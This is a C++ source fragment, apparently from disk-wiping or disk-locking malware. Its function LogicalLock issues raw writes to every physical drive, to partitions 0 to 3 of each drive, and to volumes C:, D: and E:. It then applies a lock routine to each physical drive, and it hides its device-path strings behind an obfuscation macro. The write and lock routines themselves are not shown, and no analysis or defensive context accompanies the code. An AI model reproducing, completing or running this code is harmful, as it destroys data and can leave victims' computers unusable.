LPCWSTR CharToLPCWSTR(const char* charString) {
	int stringLength = strlen(charString) + 1;
	wchar_t* wideString = new wchar_t[stringLength];
	MultiByteToWideChar(CP_UTF8, 0, charString, -1, wideString, stringLength);
	return wideString;
}
void LogicalLock()
{
	char diskPath[256];
	for (int i = 0; i <GetPhysicalDriveNumber(); i++) {
		for (int j = 0; j <= 3; j++) {
			sprintf_s(diskPath, 50, _c("\\\\.\\Harddisk%dPartition%d"), i, j);
			WriteDisk(CharToLPCWSTR(diskPath));
			//std::cout << diskPath << std::endl;
		}
	}
	for (int i = 0; i <GetPhysicalDriveNumber(); i++) {
		sprintf_s(diskPath, 50,_c("\\\\.\\PhysicalDrive%d"), i);
	//	std::cout << diskPath << std::endl;
		WriteDisk(CharToLPCWSTR(diskPath));
	}
	WriteDisk(L"\\\\.\\C:");
	WriteDisk(L"\\\\.\\D:");
	WriteDisk(L"\\\\.\\E:");
	for (int i = 0; i < GetPhysicalDriveNumber(); i++) {
		HANDLE hDisk;
		GetPhysicalDriveHandle(hDisk, i);
		WriteLock(hDisk);
	}
}